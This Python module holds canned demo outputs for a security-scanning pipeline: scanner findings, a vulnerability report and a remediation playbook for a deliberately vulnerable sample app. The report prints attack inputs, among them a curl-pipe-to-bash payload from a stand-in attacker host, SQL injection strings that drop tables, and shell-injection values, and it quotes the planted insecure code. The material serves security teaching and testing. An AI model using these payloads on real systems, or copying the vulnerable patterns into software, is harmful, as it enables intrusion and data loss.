"""
Pre-authored pipeline responses for Phase 4 demo (mock mode).
These represent the exact output a live pipeline run would produce
for samples/vulnerable_app.py using the configured agents and prompts.
"""

# ─────────────────────────────────────────────────────────────────────────────
# Stage 1 — Scanner output (what Bandit actually returns for vulnerable_app.py)
# ─────────────────────────────────────────────────────────────────────────────

SCANNER_JSON = """{
  "scan_target_description": "Python source file: samples/vulnerable_app.py (5 planted vulnerabilities)",
  "tools_executed": ["run_bandit_scan", "run_semgrep_scan"],
  "bandit_results": {
    "tool": "bandit",
    "status": "completed",
    "total_findings": 6,
    "severity_summary": { "high": 3, "medium": 2, "low": 1 },
    "findings": [
      {
        "id": "B608",
        "name": "hardcoded_sql_expressions",
        "severity": "HIGH",
        "confidence": "MEDIUM",
        "cwe": { "id": 89, "link": "https://cwe.mitre.org/data/definitions/89.html", "name": "Improper Neutralization of Special Elements used in an SQL Command" },
        "description": "Possible SQL injection via string-based query construction.",
        "line_number": 27,
        "line_range": [27, 28],
        "code_snippet": "query  = \\"SELECT id, username, role FROM users WHERE username = '\\" + username + \\"'\\"",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html"
      },
      {
        "id": "B608",
        "name": "hardcoded_sql_expressions",
        "severity": "HIGH",
        "confidence": "MEDIUM",
        "cwe": { "id": 89, "link": "https://cwe.mitre.org/data/definitions/89.html", "name": "Improper Neutralization of Special Elements used in an SQL Command" },
        "description": "Possible SQL injection via string-based query construction.",
        "line_number": 38,
        "line_range": [38, 41],
        "code_snippet": "cursor.execute(\\"UPDATE users SET email = '\\" + new_email + \\"' WHERE id = \\" + str(user_id))",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html"
      },
      {
        "id": "B307",
        "name": "eval",
        "severity": "HIGH",
        "confidence": "HIGH",
        "cwe": { "id": 78, "link": "https://cwe.mitre.org/data/definitions/78.html", "name": "Improper Neutralization of Special Elements used in an OS Command" },
        "description": "Use of possibly insecure function - consider using safer alternatives.",
        "line_number": 64,
        "line_range": [64],
        "code_snippet": "    return eval(expression)    # B307",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b307_eval.html"
      },
      {
        "id": "B602",
        "name": "subprocess_popen_with_shell_equals_true",
        "severity": "HIGH",
        "confidence": "HIGH",
        "cwe": { "id": 78, "link": "https://cwe.mitre.org/data/definitions/78.html", "name": "Improper Neutralization of Special Elements used in an OS Command" },
        "description": "subprocess call with shell=True identified, security issue.",
        "line_number": 53,
        "line_range": [53, 57],
        "code_snippet": "    result = subprocess.run(\\n        f\\"python reports/{report_name}.py\\",\\n        shell=True,",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html"
      },
      {
        "id": "B303",
        "name": "use_of_md5",
        "severity": "MEDIUM",
        "confidence": "HIGH",
        "cwe": { "id": 327, "link": "https://cwe.mitre.org/data/definitions/327.html", "name": "Use of a Broken or Risky Cryptographic Algorithm" },
        "description": "Use of insecure MD5 hash function.",
        "line_number": 47,
        "line_range": [47],
        "code_snippet": "    return hashlib.md5(plaintext.encode()).hexdigest()",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b303_use_of_md5.html"
      },
      {
        "id": "B105",
        "name": "hardcoded_password_string",
        "severity": "LOW",
        "confidence": "MEDIUM",
        "cwe": { "id": 259, "link": "https://cwe.mitre.org/data/definitions/259.html", "name": "Use of Hard-coded Password" },
        "description": "Possible hardcoded password: 'super-secret-key-do-not-share'",
        "line_number": 18,
        "line_range": [18, 19],
        "code_snippet": "SECRET_KEY  = \\"super-secret-key-do-not-share\\"",
        "more_info": "https://bandit.readthedocs.io/en/latest/plugins/b105_hardcoded_password_string.html"
      }
    ]
  },
  "semgrep_results": {
    "tool": "semgrep",
    "status": "completed",
    "total_findings": 2,
    "severity_summary": { "error": 2, "warning": 0, "info": 0 },
    "findings": [
      {
        "rule_id": "python.lang.security.audit.dangerous-eval-use.dangerous-eval-use",
        "severity": "ERROR",
        "message": "Detected the use of eval(). eval() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability.",
        "line_start": 64,
        "line_end": 64,
        "code_snippet": "    return eval(expression)",
        "cwe": ["CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code"],
        "owasp": ["A03:2021 - Injection"],
        "references": ["https://owasp.org/Top10/A03_2021-Injection/"],
        "autofix": null
      },
      {
        "rule_id": "python.lang.security.audit.subprocess-shell-true.subprocess-shell-true",
        "severity": "ERROR",
        "message": "Found subprocess function with shell=True. This is dangerous because this call will spawn the command using the shell, which means shell metacharacters can be abused.",
        "line_start": 53,
        "line_end": 57,
        "code_snippet": "    result = subprocess.run(\\n        f\\"python reports/{report_name}.py\\",\\n        shell=True,",
        "cwe": ["CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"],
        "owasp": ["A03:2021 - Injection"],
        "references": ["https://owasp.org/Top10/A03_2021-Injection/"],
        "autofix": null
      }
    ],
    "scan_errors": []
  },
  "virustotal_results": null,
  "headers_results": null
}"""


# ─────────────────────────────────────────────────────────────────────────────
# Stage 2 — Analyst report
# ─────────────────────────────────────────────────────────────────────────────

ANALYST_MARKDOWN = """## Vulnerability Report
**Target:** Python source file: samples/vulnerable_app.py (5 planted vulnerabilities)
**Analysis Date:** 2026-06-19
**Overall Risk Level:** CRITICAL

### Executive Summary
The scanned Python application contains five confirmed, independently exploitable security vulnerabilities across three OWASP Top 10 categories. The most critical finding is a pair of SQL Injection flaws that allow unauthenticated attackers to bypass authentication and exfiltrate or destroy the entire user database. Combined with an `eval()`-based Remote Code Execution vulnerability and an OS Command Injection risk via `shell=True`, a remote attacker could achieve full server compromise in a single HTTP request.

---

### Confirmed Findings

---
#### [CRITICAL] VID-1: SQL Injection in `get_user()` — Authentication Bypass
| Field | Value |
|-------|-------|
| **OWASP 2021** | A03:2021 – Injection |
| **CVSS v3.1 Score** | 9.8 (CRITICAL) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-89 – Improper Neutralization of Special Elements in an SQL Command |
| **Tool(s)** | Bandit B608 |
| **Location** | Line 27 — `get_user()` |

**Vulnerable Code Snippet:**
```python
query = "SELECT id, username, role FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**Technical Description:** The `username` parameter is concatenated directly into the SQL string without sanitisation or parameterisation. The database driver receives and executes whatever SQL is formed by the concatenation.

**Exploitability:** An attacker sends `username = "' OR '1'='1' --"`. The executed query becomes `SELECT … WHERE username = '' OR '1'='1' --'`, which always evaluates to TRUE, returning every row in the users table. With UNION-based injection the attacker can pivot to reading any table (including credentials), and with stacked queries (database-permitting) can DROP tables or INSERT admin accounts.

**False Positive Assessment:** Confirmed — no parameterisation or ORM wrapper is present. The concatenation is direct and the parameter originates from function input.

---
#### [CRITICAL] VID-2: SQL Injection in `update_email()` — Data Manipulation
| Field | Value |
|-------|-------|
| **OWASP 2021** | A03:2021 – Injection |
| **CVSS v3.1 Score** | 9.1 (CRITICAL) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-89 – Improper Neutralization of Special Elements in an SQL Command |
| **Tool(s)** | Bandit B608 |
| **Location** | Lines 38–41 — `update_email()` |

**Vulnerable Code Snippet:**
```python
cursor.execute(
    "UPDATE users SET email = '" + new_email + "' WHERE id = " + str(user_id)
)
```

**Technical Description:** Both `new_email` (string) and `user_id` (cast from int) are concatenated without sanitisation. The `str(user_id)` cast does not prevent injection — an attacker who controls `user_id` at a higher layer can pass `"1 OR 1=1"`.

**Exploitability:** Setting `new_email = "x' WHERE '1'='1' --"` overwrites every user's email in one request, enabling account takeover at scale. Setting `new_email = "x'; DROP TABLE users; --"` on a permissive DB permanently destroys all user data.

**False Positive Assessment:** Confirmed — same pattern as VID-1, different operation (UPDATE instead of SELECT).

---
#### [HIGH] VID-3: Remote Code Execution via `eval()` in `calculate()`
| Field | Value |
|-------|-------|
| **OWASP 2021** | A03:2021 – Injection |
| **CVSS v3.1 Score** | 9.0 (CRITICAL) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | CWE-95 – Improper Neutralization of Directives in Dynamically Evaluated Code |
| **Tool(s)** | Bandit B307, Semgrep (dangerous-eval-use) |
| **Location** | Line 64 — `calculate()` |

**Vulnerable Code Snippet:**
```python
return eval(expression)    # B307
```

**Technical Description:** `eval()` executes the string argument as Python bytecode in the current process context. Any Python expression — including `import` statements and OS calls — is valid input.

**Exploitability:** `expression = "__import__('os').system('curl http://attacker.com/shell.sh | bash')"` gives the attacker a reverse shell running as the application's OS user with zero additional privileges required. Both Bandit and Semgrep independently flagged this — high confidence.

**False Positive Assessment:** Confirmed — the function receives external input (`expression: str`) and passes it to `eval()` with no validation, allowlist, or sandboxing.

---
#### [HIGH] VID-4: OS Command Injection via `subprocess(shell=True)` in `run_report()`
| Field | Value |
|-------|-------|
| **OWASP 2021** | A03:2021 – Injection |
| **CVSS v3.1 Score** | 8.8 (HIGH) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-78 – Improper Neutralization of Special Elements used in an OS Command |
| **Tool(s)** | Bandit B602, Semgrep (subprocess-shell-true) |
| **Location** | Lines 53–57 — `run_report()` |

**Vulnerable Code Snippet:**
```python
result = subprocess.run(
    f"python reports/{report_name}.py",
    shell=True,
```

**Technical Description:** When `shell=True`, the entire string is passed to `/bin/sh -c`. Shell metacharacters (`; & | $()`) in `report_name` are interpreted by the shell before Python ever sees them.

**Exploitability:** `report_name = "quarterly; cat /etc/passwd"` executes two commands in sequence. `report_name = "x $(whoami)"` performs command substitution. Both Bandit and Semgrep confirmed this independently.

**False Positive Assessment:** Confirmed — `report_name` originates from the function parameter (external input path) and is interpolated directly into the shell string.

---
#### [MEDIUM] VID-5: Weak Cryptographic Hash (MD5) for Password Storage
| Field | Value |
|-------|-------|
| **OWASP 2021** | A02:2021 – Cryptographic Failures |
| **CVSS v3.1 Score** | 7.5 (HIGH) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-327 – Use of a Broken or Risky Cryptographic Algorithm |
| **Tool(s)** | Bandit B303 |
| **Location** | Line 47 — `hash_password()` |

**Vulnerable Code Snippet:**
```python
return hashlib.md5(plaintext.encode()).hexdigest()
```

**Technical Description:** MD5 produces a 128-bit digest with no salt. It is computationally broken: GPU-accelerated rainbow table attacks recover common passwords in milliseconds. NIST SP 800-131A explicitly disallows MD5 for security purposes.

**Exploitability:** If the database is exfiltrated (via VID-1), an attacker submits all MD5 hashes to a service like CrackStation and recovers plaintext passwords for reuse in credential-stuffing attacks against email and banking sites.

**False Positive Assessment:** Confirmed — MD5 is used directly on the plaintext with no salt, no iteration, and no modern KDF wrapping.

---
#### [LOW] VID-6: Hardcoded Secret Key in Source Code
| Field | Value |
|-------|-------|
| **OWASP 2021** | A07:2021 – Identification and Authentication Failures |
| **CVSS v3.1 Score** | 5.5 (MEDIUM) |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-798 – Use of Hard-coded Credentials |
| **Tool(s)** | Bandit B105 |
| **Location** | Lines 18–19 — module level |

**Vulnerable Code Snippet:**
```python
SECRET_KEY  = "super-secret-key-do-not-share"
DB_PASSWORD = "admin123"
```

**Technical Description:** Credentials committed to source control are permanently visible in git history, CI logs, and any environment with read access to the repository. The secret cannot be rotated without a code change and redeployment.

**Exploitability:** Any developer, contractor, or attacker with repository read access can immediately use these credentials. The secret is also visible in any container image built from this code and in crash dumps.

**False Positive Assessment:** Confirmed — plaintext secret directly assigned to a module-level variable. No environment variable lookup, no secrets manager.

---

### Excluded Findings (False Positives)
None. All six Bandit findings were validated as true positives. The two Semgrep findings are merged into VID-3 and VID-4 (same vulnerabilities flagged by both tools).

---

### Risk Summary Table
| VID | Title | CVSS Score | OWASP | Priority |
|-----|-------|-----------|-------|----------|
| VID-1 | SQL Injection — `get_user()` | 9.8 | A03:2021 | CRITICAL |
| VID-2 | SQL Injection — `update_email()` | 9.1 | A03:2021 | CRITICAL |
| VID-3 | RCE via `eval()` | 9.0 | A03:2021 | CRITICAL |
| VID-4 | OS Command Injection | 8.8 | A03:2021 | HIGH |
| VID-5 | Weak MD5 Password Hash | 7.5 | A02:2021 | HIGH |
| VID-6 | Hardcoded Secret Key | 5.5 | A07:2021 | MEDIUM |

### Scanner Tool Errors
None.
"""


# ─────────────────────────────────────────────────────────────────────────────
# Stage 3 — Remediation playbook
# ─────────────────────────────────────────────────────────────────────────────

REMEDIATION_MARKDOWN = """## Remediation Playbook
**Report Reference:** samples/vulnerable_app.py — Analysis Date: 2026-06-19
**Playbook Generated:** 2026-06-19

---

### Fix for VID-1 & VID-2: SQL Injection in `get_user()` and `update_email()`

**Vulnerability Recap:** String concatenation is used to build SQL queries, allowing an attacker to inject arbitrary SQL.

**Root Cause:** The SQLite `cursor.execute()` call receives a fully-formed SQL string assembled from user input instead of using the DB-API 2.0 parameterised form.

**Fix Strategy:** Replace string concatenation with parameterised queries. The DB driver escapes all parameter values before substitution, making injection structurally impossible regardless of input content.

#### Before (Vulnerable)
```python
def get_user(username: str) -> tuple | None:
    conn   = sqlite3.connect("app.db")
    cursor = conn.cursor()
    query  = "SELECT id, username, role FROM users WHERE username = '" + username + "'"
    cursor.execute(query)
    return cursor.fetchone()


def update_email(user_id: int, new_email: str) -> None:
    conn   = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET email = '" + new_email + "' WHERE id = " + str(user_id)
    )
    conn.commit()
```

#### After (Secure)
```python
def get_user(username: str) -> tuple | None:
    conn   = sqlite3.connect("app.db")
    cursor = conn.cursor()
    # Parameterised placeholder — driver escapes username before substitution.
    cursor.execute(
        "SELECT id, username, role FROM users WHERE username = ?",
        (username,),
    )
    return cursor.fetchone()


def update_email(user_id: int, new_email: str) -> None:
    conn   = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET email = ? WHERE id = ?",
        (new_email, user_id),
    )
    conn.commit()
```

**What Changed:**
- Replaced string concatenation with `?` placeholders — the DB driver, not the application, handles escaping.
- `user_id` is passed as a parameter (type-safe), removing the `str()` cast that introduced a secondary injection surface.
- Both READ and WRITE operations now use the same safe pattern.

**OWASP ASVS Control:** V5.3.4 — Verify that parameterized queries or stored procedures are used to protect against SQL injection.

**Additional Hardening:**
```python
# Add an input-length guard at the API boundary (not a substitute for parameterisation)
def get_user(username: str) -> tuple | None:
    if not username or len(username) > 64:
        raise ValueError("Invalid username")
    ...
```

**Verification:**
```python
def test_get_user_rejects_sql_injection(tmp_path, monkeypatch):
    import sqlite3, os
    db = str(tmp_path / "app.db")
    monkeypatch.chdir(tmp_path)
    conn = sqlite3.connect(db)
    conn.execute("CREATE TABLE users (id INTEGER, username TEXT, role TEXT)")
    conn.execute("INSERT INTO users VALUES (1, 'alice', 'user')")
    conn.commit()

    from vulnerable_app import get_user
    # Classic injection payload must return None, not all rows
    result = get_user("' OR '1'='1")
    assert result is None, "SQL injection payload returned data — parameterisation is broken"
```

---

### Fix for VID-3: Remote Code Execution via `eval()`

**Vulnerability Recap:** `eval()` executes an attacker-controlled string as Python bytecode.

**Root Cause:** `eval()` is the wrong tool for evaluating arithmetic expressions from untrusted input. It has no sandbox — it can import modules, open files, and spawn processes.

**Fix Strategy:** Replace `eval()` with `ast.literal_eval()` for pure data expressions, or use a purpose-built safe expression parser (`simpleeval`) for arithmetic. Both are structurally incapable of executing arbitrary code.

#### Before (Vulnerable)
```python
def calculate(expression: str) -> float:
    return eval(expression)
```

#### After (Secure)
```python
import ast
import operator
import re

# Allowlisted operators only — no function calls, no attribute access.
_ALLOWED_OPERATORS = {
    ast.Add:  operator.add,
    ast.Sub:  operator.sub,
    ast.Mult: operator.mul,
    ast.Div:  operator.truediv,
    ast.Pow:  operator.pow,
    ast.USub: operator.neg,
}

def calculate(expression: str) -> float:
    \"\"\"
    Safely evaluate a mathematical expression.
    Raises ValueError for any non-arithmetic input.
    \"\"\"
    if len(expression) > 200:
        raise ValueError("Expression too long")

    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise ValueError(f"Invalid expression: {exc}") from exc

    return _safe_eval(tree.body)


def _safe_eval(node: ast.expr) -> float:
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return float(node.value)
    if isinstance(node, ast.BinOp) and type(node.op) in _ALLOWED_OPERATORS:
        return _ALLOWED_OPERATORS[type(node.op)](
            _safe_eval(node.left), _safe_eval(node.right)
        )
    if isinstance(node, ast.UnaryOp) and type(node.op) in _ALLOWED_OPERATORS:
        return _ALLOWED_OPERATORS[type(node.op)](_safe_eval(node.operand))
    raise ValueError(f"Unsupported expression node: {type(node).__name__}")
```

**What Changed:**
- `eval()` removed entirely — never touches the input string.
- `ast.parse(mode="eval")` parses to an AST without executing anything.
- `_safe_eval()` walks the AST and only evaluates numeric constants and allowlisted arithmetic operators.
- Any attempt to call a function, access an attribute, or import a module raises `ValueError` before execution.

**OWASP ASVS Control:** V5.2.4 — Verify that the application does not use eval() or other dynamic code execution features with user-controlled data.

**Verification:**
```python
def test_calculate_blocks_rce():
    from vulnerable_app_fixed import calculate
    import pytest

    assert calculate("2 + 3 * 4") == 14.0
    assert calculate("10 / 2") == 5.0

    with pytest.raises(ValueError):
        calculate("__import__('os').system('id')")

    with pytest.raises(ValueError):
        calculate("open('/etc/passwd').read()")
```

---

### Fix for VID-4: OS Command Injection via `subprocess(shell=True)`

**Vulnerability Recap:** `report_name` is interpolated into a shell string, allowing shell metacharacter injection.

**Root Cause:** `shell=True` hands the entire string to `/bin/sh`, which interprets `;`, `|`, `&`, and `$()` before executing. The solution is to pass the command as a list and never involve a shell.

#### Before (Vulnerable)
```python
def run_report(report_name: str) -> str:
    result = subprocess.run(
        f"python reports/{report_name}.py",
        shell=True,
        capture_output=True,
        text=True,
    )
    return result.stdout
```

#### After (Secure)
```python
import re
import subprocess
from pathlib import Path

_SAFE_REPORT_NAME = re.compile(r"^[a-zA-Z0-9_-]{1,64}$")

def run_report(report_name: str) -> str:
    \"\"\"
    Run a named report script.
    Raises ValueError if report_name contains anything other than
    alphanumerics, underscores, and hyphens.
    \"\"\"
    if not _SAFE_REPORT_NAME.match(report_name):
        raise ValueError(f"Invalid report name: {report_name!r}")

    report_path = Path("reports") / f"{report_name}.py"
    if not report_path.is_file():
        raise FileNotFoundError(f"Report not found: {report_path}")

    # List form + shell=False: the shell never sees this command.
    result = subprocess.run(
        ["python", str(report_path)],
        shell=False,
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout
```

**What Changed:**
- `shell=False` (the default) — subprocess exec's Python directly; no shell is involved.
- Command is a `list`, not a string — each element is passed as a literal argument.
- Allowlist regex `^[a-zA-Z0-9_-]{1,64}$` rejects any input containing `;`, `|`, `/`, `$`, spaces, or other shell metacharacters before the subprocess call.
- Path is resolved with `pathlib.Path` and existence-checked to prevent directory traversal.

**OWASP ASVS Control:** V5.3.8 — Verify that the application does not call OS commands via the shell interpreter with user-supplied data.

**Verification:**
```python
def test_run_report_blocks_shell_injection():
    from vulnerable_app_fixed import run_report
    import pytest

    with pytest.raises(ValueError):
        run_report("quarterly; rm -rf /")

    with pytest.raises(ValueError):
        run_report("x $(whoami)")

    with pytest.raises(ValueError):
        run_report("../../../etc/passwd")
```

---

### Fix for VID-5: Replace MD5 with bcrypt for Password Hashing

**Vulnerability Recap:** MD5 is a broken hash with no salt; rainbow tables crack common passwords instantly.

**Root Cause:** MD5 was designed for fast integrity checking, not password storage. A modern password KDF must be slow (configurable work factor), salted (prevents rainbow tables), and collision-resistant.

**Fix Strategy:** Replace MD5 with `bcrypt`. bcrypt automatically generates a random 128-bit salt, applies a cost factor (rounds), and encodes salt + hash together — making each stored hash unique even for identical passwords.

#### Before (Vulnerable)
```python
import hashlib

def hash_password(plaintext: str) -> str:
    return hashlib.md5(plaintext.encode()).hexdigest()

def verify_password(plaintext: str, stored_hash: str) -> bool:
    return hash_password(plaintext) == stored_hash
```

#### After (Secure)
```python
import bcrypt

def hash_password(plaintext: str) -> str:
    \"\"\"
    Hash a password using bcrypt with a work factor of 12.
    Returns a 60-character string that includes the salt.
    \"\"\"
    return bcrypt.hashpw(
        plaintext.encode("utf-8"),
        bcrypt.gensalt(rounds=12),
    ).decode("utf-8")

def verify_password(plaintext: str, stored_hash: str) -> bool:
    \"\"\"
    Constant-time comparison via bcrypt.checkpw() — immune to timing attacks.
    \"\"\"
    return bcrypt.checkpw(
        plaintext.encode("utf-8"),
        stored_hash.encode("utf-8"),
    )
```

**What Changed:**
- `hashlib.md5` → `bcrypt.hashpw` — bcrypt is the correct primitive for password storage.
- `gensalt(rounds=12)` generates a cryptographically random 128-bit salt and applies 2¹² = 4096 iterations (≈100ms on modern hardware — fast for users, expensive for attackers).
- `bcrypt.checkpw()` performs a constant-time comparison that is immune to timing side-channel attacks.
- The stored value is self-contained: `$2b$12$<22-char-salt><31-char-hash>` — no separate salt column needed.

**OWASP ASVS Control:** V2.4.1 — Verify that passwords are stored using an adaptive one-way function (bcrypt, Argon2id, scrypt) with a work factor that makes brute-force attacks infeasible.

**Additional Hardening:**
```bash
# Add to requirements.txt
bcrypt>=4.1.0
```

**Verification:**
```python
def test_hash_password_unique_salts():
    from vulnerable_app_fixed import hash_password, verify_password

    h1 = hash_password("hunter2")
    h2 = hash_password("hunter2")
    assert h1 != h2, "Same password must produce different hashes (salts differ)"
    assert verify_password("hunter2", h1)
    assert verify_password("hunter2", h2)
    assert not verify_password("wrong", h1)
```

---

### Fix for VID-6: Load Secrets from Environment Variables

**Vulnerability Recap:** Credentials are hardcoded in source, making them visible in git history and CI logs.

**Root Cause:** Secrets belong in the environment (12-Factor App principle), not in code.

#### Before (Vulnerable)
```python
SECRET_KEY  = "super-secret-key-do-not-share"
DB_PASSWORD = "admin123"
```

#### After (Secure)
```python
import os
from functools import lru_cache

@lru_cache(maxsize=1)
def get_secret_key() -> str:
    key = os.environ.get("APP_SECRET_KEY", "")
    if not key or len(key) < 32:
        raise RuntimeError(
            "APP_SECRET_KEY must be set to a random string of at least 32 characters. "
            "Generate one with: python -c \\"import secrets; print(secrets.token_hex(32))\\""
        )
    return key

@lru_cache(maxsize=1)
def get_db_password() -> str:
    pwd = os.environ.get("DB_PASSWORD", "")
    if not pwd:
        raise RuntimeError("DB_PASSWORD environment variable is not set.")
    return pwd
```

**What Changed:**
- Secrets removed from source entirely — no credential ever appears in the codebase.
- `os.environ.get()` reads from the process environment (set via `.env`, Docker secret, or Vault).
- Validation at startup (`len(key) < 32`) catches misconfigured environments before they reach production.
- `@lru_cache` ensures the env lookup happens once, avoiding repeated `os.environ` calls in hot paths.

**OWASP ASVS Control:** V2.10.4 — Verify that passwords, key material, and other secrets are not hardcoded into application source code.

**Additional Hardening:**
```bash
# .gitignore — ensure .env is never committed
echo ".env" >> .gitignore

# Rotate the secret immediately — git history is permanent
git filter-repo --path-glob '*.py' --replace-text <(echo 'super-secret-key-do-not-share==>REDACTED')
```

---

### Overall Hardening Checklist
- [ ] **VID-1 & VID-2:** Replace all SQL string concatenation with `?` parameterised placeholders
- [ ] **VID-3:** Remove `eval()` — implement `_safe_eval()` AST walker
- [ ] **VID-4:** Set `shell=False` on all `subprocess` calls; validate input with allowlist regex
- [ ] **VID-5:** Migrate password storage to `bcrypt` (add `bcrypt>=4.1.0` to `requirements.txt`); re-hash all existing passwords on next login
- [ ] **VID-6:** Move `SECRET_KEY` and `DB_PASSWORD` to environment variables; revoke and rotate the exposed values immediately
- [ ] **Code review gate:** Add `bandit` and `semgrep --config p/owasp-top-ten` to pre-commit hooks so these patterns cannot re-enter the codebase
- [ ] **Re-scan after fixes:** `python main.py --code samples/vulnerable_app_fixed.py --scanner-only`
"""
